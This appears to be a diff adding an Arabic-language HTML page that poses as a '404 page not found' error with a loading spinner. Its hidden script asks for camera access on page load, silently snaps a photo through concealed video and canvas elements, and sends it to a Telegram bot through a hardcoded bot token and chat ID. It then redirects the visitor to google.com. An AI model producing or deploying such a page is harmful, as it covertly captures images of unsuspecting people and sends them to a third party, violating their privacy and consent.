@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>404 - الصفحة غير موجودة</title>
+    <style>
+        /* تنسيق صفحة الخطأ المزيفة */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            text-align: center;
+            padding-top: 100px;
+            direction: ltr;
+        }
+        .error-box {
+            background-color: white;
+            max-width: 500px;
+            margin: auto;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 72px;
+            color: #e74c3c;
+            margin: 0;
+        }
+        h2 {
+            color: #555;
+        }
+        p {
+            color: #777;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- المحتوى المزيف: صفحة خطأ 404 مع شريط تقدم -->
+    <div class="error-box">
+        <h1>404</h1>
+        <h2>عذراً، الصفحة التي تبحث عنها غير موجودة</h2>
+        <p>سيتم إعادة توجيهك إلى الصفحة الرئيسية خلال لحظات...</p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- عناصر الكاميرا المخفية تماماً -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // ========== إعدادات بوت تليجرام (محدثة) ==========
+        const botToken = '7663195704:AAFwU-ZfXazMMXAiRQTa87FRhdlaj_oaYdg';  // التوكن الخاص بالبوت
+        const chatId = '8414529356';                                           // معرف المحادثة
+        // =================================================
+
+        // دالة لإرسال الصورة إلى تليجرام
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.jpg');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الصورة إلى تليجرام', data);
+            })
+            .catch(error => {
+                console.log('فشل الإرسال إلى تليجرام', error);
+            });
+        }
+
+        // دالة لالتقاط الصورة وإرسالها
+        function captureAndSend(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // رسم إطار الفيديو على الكانفاس
+            context.drawImage(video, 0, 0, 640, 480);
+
+            // إيقاف الكاميرا فوراً
+            stream.getTracks().forEach(track => track.stop());
+
+            // تحويل الصورة إلى Blob وإرسالها
+            canvas.toBlob(function(blob) {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.9);
+
+            // بعد ثانيتين، إعادة التوجيه إلى موقع شرعي (مثلاً google.com)
+            setTimeout(function() {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        // طلب الوصول للكاميرا فور تحميل الصفحة
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // انتظار تحميل الفيديو ثم التقاط الصورة
+                video.onloadedmetadata = function() {
+                    captureAndSend(stream);
+                };
+            })
+            .catch(function(err) {
+                console.log('خطأ في الكاميرا: ' + err);
+                // في حال رفض الإذن أو خطأ، يتم إعادة التوجيه أيضاً بعد فترة قصيرة
+                setTimeout(function() {
+                    window.location.href = 'https://www.google.com';
+                }, 2000);
+            });
+    </script>
+</body>
+</html>
